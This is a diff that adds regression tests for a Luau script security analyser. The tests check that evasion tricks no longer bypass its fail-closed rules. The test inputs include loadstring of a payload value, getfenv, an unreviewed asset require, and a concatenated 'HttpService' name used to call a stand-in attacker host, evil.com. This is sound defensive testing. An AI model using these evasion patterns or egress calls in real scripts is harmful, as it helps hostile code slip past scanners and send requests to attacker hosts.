@@ -584,3 +584,48 @@ describe('binding, reachability and decoding regressions', () => {
     expect(rules('local n = 1\nspawn(function() end)\n')).toEqual(['luau/deprecated-wait-spawn']);
   });
 });
+
+/**
+ * Round-3 review found two ways the fail-closed work had itself gone fail-open.
+ * Both were reproduced against the built analyser before being fixed; both
+ * returned `status: 'ok'` with zero findings.
+ */
+describe('fail-closed regressions, round two', () => {
+  const ALLOW: AnalyseOptions = { allowedHttpHosts: ['api.example.com'] };
+
+  it('does not let a bare `local` on the line above disarm the global rules', () => {
+    // The declaration walk had no statement boundary, so it crossed out of
+    // `local cache` into the statement below. Two tokens of prefix silently
+    // switched off no-loadstring, no-getfenv-setfenv, require-unreviewed-asset
+    // and deprecated-wait-spawn — every rule built on isGlobalReference, at once.
+    expect(analyse('local cache\nloadstring(script.Parent.Payload.Value)()\n').status).not.toBe('ok');
+    expect(analyse('local cache\ngetfenv(1)\n').status).not.toBe('ok');
+    expect(analyse('local cache\nrequire(1234567)\n').status).not.toBe('ok');
+  });
+
+  it('still treats a real multi-name declaration as a declaration', () => {
+    // The control. This is why the permissive walk existed: firing on the line
+    // that shadows the global is a rule people learn to click past.
+    expect(analyse('local ok, loadstring = pcall(f)\n')).toEqual({ status: 'ok', findings: [] });
+    expect(analyse('local a: number, b: string = 1, "x"\n')).toEqual({ status: 'ok', findings: [] });
+    expect(analyse('local function h(player, spawn)\n  return player, spawn\nend\n')).toEqual({
+      status: 'ok',
+      findings: [],
+    });
+  });
+
+  it('arms the egress guard even when the service name is assembled at run time', () => {
+    // The guard that arms the fail-closed branch was itself gated on the
+    // literal string "HttpService" appearing. A two-character concatenation
+    // put the whole file back in the "nothing to see here" bucket.
+    const source = 'local H = game:GetService("Http" .. "Service")\nH:GetAsync("https://evil.com/x")\n';
+    expect(analyse(source, ALLOW).status).not.toBe('ok');
+  });
+
+  it('does not arm it for a service call it CAN read', () => {
+    // The control: a readable literal that is not HttpService stays quiet, so
+    // fail-closed does not become fail-noisy.
+    const source = 'local ds = game:GetService("DataStoreService"):GetDataStore("s")\nlocal v = ds:GetAsync("k")\n';
+    expect(analyse(source, ALLOW)).toEqual({ status: 'ok', findings: [] });
+  });
+});
